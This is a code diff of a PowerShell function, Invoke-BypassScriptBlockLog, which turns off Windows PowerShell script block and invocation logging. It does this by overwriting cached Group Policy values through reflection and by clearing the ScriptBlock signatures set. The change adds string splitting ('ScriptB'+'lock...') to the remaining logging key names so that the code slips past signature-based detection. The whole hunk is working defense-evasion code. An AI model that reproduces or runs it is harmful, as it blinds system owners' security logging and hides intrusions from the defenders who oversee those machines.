@@ -5,11 +5,11 @@ function Invoke-BypassScriptBlockLog {
         $GPC=$GPF.GetValue($null);
         If($GPC['ScriptB'+'lockLogging']){
             $GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;
-            $GPC['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0
+            $GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockInvocationLogging']=0
         }
         $val=[Collections.Generic.Dictionary[string,System.Object]]::new();
         $val.Add('EnableScriptB'+'lockLogging',0);
-        $val.Add('EnableScriptBlockInvocationLogging',0);
+        $val.Add('EnableScriptB'+'lockInvocationLogging',0);
         $GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=$val
     } Else {
         [ScriptBlock].GetField('signatures','N'+'onPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
